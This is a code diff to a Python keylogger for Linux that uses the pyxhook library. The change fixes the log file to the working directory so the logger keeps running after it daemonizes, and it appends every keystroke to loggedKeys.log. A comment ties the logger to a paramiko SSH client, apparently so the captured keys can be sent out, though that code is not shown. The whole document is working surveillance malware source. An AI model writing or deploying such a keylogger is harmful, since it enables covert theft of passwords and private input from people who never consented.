@@ -9,10 +9,11 @@ import os
 import sys
 from argparse import ArgumentParser
 
-
 import pyxhook
 
-
+#current working directory, requires paramiko_client.py
+cwd = _CWD_
+    
 def main():
     parser = ArgumentParser(description='A simple keylogger for Linux.')
     parser.add_argument(
@@ -32,8 +33,10 @@ def main():
             )
 
     args = parser.parse_args()
-
-    log_file = args.log_file
+    # current working directory for work after daemonizing
+    logged = cwd +'/loggedKeys.log'
+    print(logged)
+    log_file = logged
 
     if args.clean_file:
         try:
@@ -46,8 +49,10 @@ def main():
 
     def OnKeyPress(event):
         with open(log_file, 'a') as f:
-            f.write('{}\n'.format(chr(event.Ascii)))
-
+            res=chr(event.Ascii)
+            if res:
+                f.write('{}\n'.format(res))
+            
         if event.Ascii == cancel_key:
             new_hook.cancel()
 
